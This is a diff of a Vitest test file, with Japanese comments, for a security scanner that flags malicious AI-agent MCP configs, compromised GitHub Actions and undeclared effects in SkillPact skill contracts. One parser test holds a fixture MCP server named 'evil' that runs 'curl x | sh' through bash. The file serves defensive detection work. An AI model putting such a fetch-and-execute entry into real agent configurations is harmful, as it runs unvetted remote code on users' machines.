@@ -1,6 +1,7 @@
 import { describe, expect, it } from 'vitest';
 import { analyzeFiles, analyzePaste, IOC } from '../../src/engine';
 import { parseFindingsDoc, toFindingsDoc } from '../../src/engine/export';
+import { ijsonProblem } from '../../src/engine/skillpact';
 import { checkoutRefs } from '../../src/engine/rules/ciAndExtensions';
 import { parseCodexToml } from '../../src/engine/rules/agentConfig';
 import { refang, versionMatches } from '../../src/engine/util';
@@ -18,9 +19,9 @@ describe('util', () => {
     expect(versionMatches('2026.9.1', '<2026.10.19')).toBe(true);
     expect(versionMatches('2026.10.19', '<2026.10.19')).toBe(false);
   });
-  it('codex TOML minimal parser', () => {
+  it('codex TOML parser', () => {
     const s = parseCodexToml('[mcp_servers.evil]\ncommand = "bash"\nargs = ["-c", "curl x | sh"]\n[other]\ncommand = "no"\n');
-    expect(s).toEqual([{ name: 'evil', command: 'bash', args: ['-c', 'curl x | sh'] }]);
+    expect(s).toEqual({ servers: [{ name: 'evil', command: 'bash', args: ['-c', 'curl x | sh'] }], problems: [] });
   });
   it('checkout ref classification', () => {
     expect(checkoutRefs('steps:\n  - uses: actions/checkout@v4\n  - run: x\n')).toEqual(['noref']);
@@ -61,7 +62,8 @@ describe('Layer 1 fixtures（CLI と同じ検出）', () => {
     // 所有者名の大文字小文字違い・YAML フローマッピングでも検出する
     expect(k).toContain('CRITICAL §22 github-actions/.github/workflows/case-variant.yml');
     expect(k).toContain('CRITICAL §22 github-actions/.github/workflows/flow-mapping.yml');
-    expect(r.viewers.actions.flatMap((w) => w.uses.map((u) => u.kind)).sort()).toEqual(['compromised', 'compromised', 'sha', 'sha', 'sha', 'tag', 'tag']);
+    // run: | の中の "uses: actions/checkout@v1"（safe-base-ref.yml）はステップとして数えない
+    expect(r.viewers.actions.flatMap((w) => w.uses.map((u) => u.kind)).sort()).toEqual(['compromised', 'compromised', 'sha', 'sha', 'sha', 'sha', 'sha', 'sha', 'sha', 'tag', 'tag', 'tag']);
   });
   it('browser extensions（権限昇格）', async () => {
     const r = await analyzeFiles(loadFixture('browser-ext'));
@@ -78,45 +80,67 @@ describe('Layer 1 fixtures（CLI と同じ検出）', () => {
   });
 });
 
-describe('SkillPact（§49）', () => {
+describe('SkillPact（§49、実験的）', () => {
   const sp = async (n: string) => analyzeFiles(loadFixture(n));
-  it('契約なし → HIGH', async () => {
-    const r = await sp('skillpact-undeclared');
-    expect(keys(r)).toEqual(['HIGH §49 skillpact-undeclared']);
-    expect(r.skillpact[0]?.observed).toEqual(['exec', 'network', 'read']);
-  });
-  it('乖離 → CRITICAL、divergence に exec', async () => {
-    const r = await sp('skillpact-divergence');
-    expect(keys(r)).toEqual(['CRITICAL §49 skillpact-divergence']);
-    expect(r.findings[0]?.skillpact?.divergence).toEqual(['exec']);
-  });
-  it('L3 署名済みでも乖離は CRITICAL（信頼判定に使わない）', async () => {
-    const r = await sp('skillpact-signed-divergence');
-    expect(r.findings.every((f) => f.level === 'CRITICAL')).toBe(true);
-    expect(r.findings[0]?.skillpact?.signed).toBe(true);
-    expect(r.findings.length).toBe(3);
-  });
-  it('差分異常 → HIGH（L3 署名済み）', async () => {
-    const r = await sp('skillpact-diff-anomaly');
-    expect(keys(r)).toEqual(['HIGH §49 skillpact-diff-anomaly/v2/skill.contract.json']);
-    expect(r.findings[0]?.campaign).toBe('skillpact-account-compromise');
-    expect(r.skillpact.find((s) => s.name === 'v1')?.results.find((x) => x.ruleNo === 10)?.status).toBe('undetermined');
-  });
-  it('prose 矛盾 / 破壊的 × allow / 永続化 / ポリシー / reversible', async () => {
-    expect(keys(await sp('skillpact-prose'))).toEqual(['HIGH §49 skillpact-prose/skill.contract.json']);
-    expect(keys(await sp('skillpact-destructive'))).toEqual(['HIGH §49 skillpact-destructive', 'HIGH §49 skillpact-destructive/skill.contract.json']);
-    expect(keys(await sp('skillpact-persistence'))).toEqual(['CRITICAL §49 skillpact-persistence']);
-    expect(keys(await sp('skillpact-policy'))).toEqual(['HIGH §49 skillpact-policy/.skillpact/policy.json', 'HIGH §49 skillpact-policy/skill.contract.json', 'MEDIUM §49 skillpact-policy/skill.contract.json']);
-    expect(keys(await sp('skillpact-reversible'))).toEqual(['CRITICAL §49 skillpact-reversible/skill.contract.json']);
-  });
-  it('一致するスキルは検出なし', async () => {
+  const camp = (r: Awaited<ReturnType<typeof analyzeFiles>>) => r.findings.map((f) => `${f.level} ${f.campaign} ${f.path}`).sort();
+  it('実在する署名付き 0.8 契約（conformance v08-valid-signed）は検出なし・L1 相当・署名は未検証', async () => {
     const r = await sp('skillpact-clean');
     expect(r.findings).toEqual([]);
-    expect(r.skillpact[0]?.results.filter((x) => x.status === 'hit')).toEqual([]);
+    const a = r.skillpact[0]!;
+    expect([a.level, a.signed, a.declared, a.contract.status]).toEqual(['L1', true, ['exec'], 'ok']);
+    expect(a.results.filter((x) => x.status === 'hit')).toEqual([]);
+  });
+  it('契約なしのスキルは参考 INFO のみ。契約付きスキル配下の SKILL.md は報告しない', async () => {
+    const r = await sp('skillpact-undeclared');
+    expect(camp(r)).toEqual(['INFO skillpact-undeclared skillpact-undeclared/standalone']);
+    expect(r.findings[0]?.skillpact?.divergence).toEqual([]);
+    expect(r.skillpact.map((s) => s.skillId)).toEqual(['skillpact-undeclared/contracted', 'skillpact-undeclared/standalone']);
+  });
+  it('未宣言の network は HIGH、機密ファイルの read / 作業領域外の write は MEDIUM', async () => {
+    const r = await sp('skillpact-divergence');
+    expect(camp(r)).toEqual([
+      'HIGH skillpact-divergence skillpact-divergence/net-tool',
+      'MEDIUM skillpact-divergence skillpact-divergence/net-tool',
+      'MEDIUM skillpact-divergence skillpact-divergence/persist-tool',
+    ]);
+    expect(r.skillpact.find((s) => s.name === 'net-tool')?.divergence.map((d) => d.effect)).toEqual(['network', 'read']);
+    expect(r.findings.every((f) => f.skillpact?.observed_effects.every((e) => ['read', 'write', 'network', 'exec', 'spend', 'send'].includes(e)))).toBe(true);
+  });
+  it('署名があっても重大度は変えない（network 乖離は HIGH）。改変したファイルは INTEGRITY_MISMATCH', async () => {
+    const r = await sp('skillpact-signed-divergence');
+    expect(camp(r)).toEqual(['HIGH skillpact-divergence skillpact-signed-divergence/v08-valid-signed', 'MEDIUM skillpact-invalid skillpact-signed-divergence/v08-valid-signed/skill.contract.json']);
+    expect(r.findings.every((f) => f.skillpact?.signed === true && f.skillpact.level === null)).toBe(true);
+    expect(r.skillpact[0]?.contract.errors).toEqual(['INTEGRITY_MISMATCH']);
+  });
+  it('未対応の版・不正 JSON・検証できない契約は MEDIUM（CRITICAL にしない、黙って通さない）', async () => {
+    expect(camp(await sp('skillpact-version'))).toEqual(['MEDIUM skillpact-invalid skillpact-version/version-unknown-major/skill.contract.json']);
+    const m = await sp('skillpact-malformed');
+    expect(camp(m)).toEqual(['MEDIUM skillpact-invalid skillpact-malformed/json-duplicate-key/skill.contract.json', 'MEDIUM skillpact-invalid skillpact-malformed/v08-json-bigint/skill.contract.json']);
+    expect(m.errors.map((e) => e.reason).sort()).toEqual(['contract_unparseable:skillpact-malformed/json-duplicate-key/skill.contract.json', 'contract_unparseable:skillpact-malformed/v08-json-bigint/skill.contract.json']);
+    const i = await sp('skillpact-invalid');
+    expect(i.skillpact.map((s) => s.contract.errors)).toEqual([['INTEGRITY_MISMATCH'], ['UNDECLARED_EFFECT']]);
+  });
+  it('前版から major を上げずに network を追加 → HIGH（同一の作者鍵）', async () => {
+    const r = await sp('skillpact-diff-anomaly');
+    expect(camp(r)).toEqual(['HIGH skillpact-account-compromise skillpact-diff-anomaly/v2/skill.contract.json']);
+    const v2 = r.skillpact.find((s) => s.name === 'v2')!;
+    expect([v2.diffAnomaly?.widened, v2.diffAnomaly?.identity]).toEqual([['network: none→scoped'], 'same']);
+    expect(r.skillpact.find((s) => s.name === 'v1')?.results.find((x) => x.ruleNo === 9)?.status).toBe('undetermined');
+  });
+  it('ポリシーは policy_version で検出し構造のみ検査（実例 strict-ci.json は妥当）', async () => {
+    expect(camp(await sp('skillpact-policy'))).toEqual(['MEDIUM skillpact-invalid skillpact-policy/policies/broken.json']);
+  });
+  it('I-JSON 検査', () => {
+    expect(ijsonProblem('{"a":1,"a":2}')).toBe('duplicate member name');
+    expect(ijsonProblem('{"a":9007199254740993}')).toBe('number outside ±(2^53-1)');
+    expect(ijsonProblem('{"a":"\\ud800"}')).toBe('invalid UTF-8 or lone surrogate');
+    expect(ijsonProblem('[]')).toBe('top-level value is not an object');
+    expect(ijsonProblem('{"a":{"b":[1,2,{"c":"x"}]},"d":-1.5e3}')).toBeNull();
   });
   it('§49 の全 finding に skillpact フィールド', async () => {
-    const r = await analyzeFiles(['skillpact-divergence', 'skillpact-policy', 'skillpact-undeclared'].flatMap((n) => loadFixture(n)));
+    const r = await analyzeFiles(['skillpact-divergence', 'skillpact-policy', 'skillpact-undeclared', 'skillpact-malformed'].flatMap((n) => loadFixture(n)));
     expect(r.findings.filter((f) => f.module === '§49').every((f) => f.skillpact)).toBe(true);
+    expect(r.findings.some((f) => f.module === '§49' && f.level === 'CRITICAL')).toBe(false);
   });
 });
 
@@ -159,7 +183,7 @@ describe('内容非出力・決定性・エクスポート', () => {
     expect(JSON.stringify(f)).not.toContain('again');
   });
   it('findings.json 互換で書き出し・読み込みできる', async () => {
-    const r = await analyzeFiles(loadFixture('skillpact-divergence'));
+    const r = await analyzeFiles(loadFixture('skillpact-malformed'));
     const doc = toFindingsDoc(r.findings, r.errors, IOC.incident_bundle, '2026-10-22T00:00:00Z', '2026-10-22T00:00:01Z');
     expect(doc.status).toBe('partial');
     expect(doc.findings.every((x) => x.path === null || x.path.startsWith('/'))).toBe(true);
@@ -175,7 +199,7 @@ describe('ZES 5.2.2 / 5.2.3 の検知データ（CLI と同じフィクスチャ
     (JSON.parse(readFileSync(new URL(`../../../tests/expected/${name}.json`, import.meta.url), 'utf8')) as { findings: { level: string; module: string; path: string }[] }).findings
       .filter((f) => modules.includes(f.module) && f.level !== 'INFO').map((f) => `${f.level} ${f.module} ${name}/${f.path}`).sort();
   const MODS = ['§3', '§4', '§6', '§15', '§16', '§22', '§38'];
-  const ui = (r: Awaited<ReturnType<typeof analyzeFiles>>) => [...new Set(r.findings.filter((f) => MODS.includes(f.module)).map((f) => `${f.level} ${f.module} ${f.path ?? ''}`))].sort();
+  const ui = (r: Awaited<ReturnType<typeof analyzeFiles>>) => [...new Set(r.findings.filter((f) => MODS.includes(f.module) && f.level !== 'INFO').map((f) => `${f.level} ${f.module} ${f.path ?? ''}`))].sort();
   it('intel-2026q3: GitLab / PHP2Shell / eMudhra / Jenkins / Gitea / 脆弱版 / 悪性パッケージ / Actions', async () => {
     const r = await analyzeFiles(loadFixture('intel-2026q3'));
     expect(ui(r)).toEqual([...new Set(cli('intel-2026q3', MODS))].sort());
